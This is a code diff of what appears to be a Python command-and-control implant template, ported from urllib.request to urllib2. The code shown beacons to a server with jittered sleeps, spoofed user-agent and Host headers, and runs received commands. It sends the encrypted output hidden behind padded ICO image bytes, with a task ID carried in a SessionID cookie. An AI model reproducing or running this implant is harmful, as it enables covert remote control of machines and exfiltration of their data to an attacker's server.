@@ -1,4 +1,4 @@
-import urllib, os, subprocess, re, datetime, time, base64, string, random
+import urllib2, os, subprocess, re, datetime, time, base64, string, random
 
 def parse_sleep_time(sleep):
   if sleep.endswith('s'):
@@ -100,9 +100,9 @@ while(True):
       this_timer = random.randint(timer * (1 - jitter), timer * (1 + jitter))
       time.sleep(this_timer)
       ua='%s'
-      if hh: req=urllib.request.Request(server,headers={'Host':hh,'User-agent':ua})
-      else: req=urllib.request.Request(server,headers={'User-agent':ua})
-      res=urllib.request.urlopen(req)
+      if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
+      else: req=urllib2.Request(server,headers={'User-agent':ua})
+      res=urllib2.urlopen(req)
       html = res.read()
     except Exception as e:
       E = e
@@ -212,14 +212,14 @@ while(True):
                 returnval = "ErrorCmd: %%s" %% exc.output
 
             server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
-            opener = urllib.request.build_opener()
+            opener = urllib2.build_opener()
             postcookie = encrypt(key, taskId)
             data = base64.b64decode(random.choice(icoimage))
             dataimage = data.ljust(1500, '\x00')
             dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
-            if hh: req=urllib.request.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            else: req=urllib.request.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-            res=urllib.request.urlopen(req)
+            if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            res=urllib2.urlopen(req)
             response = res.read()
 
       except Exception as e:
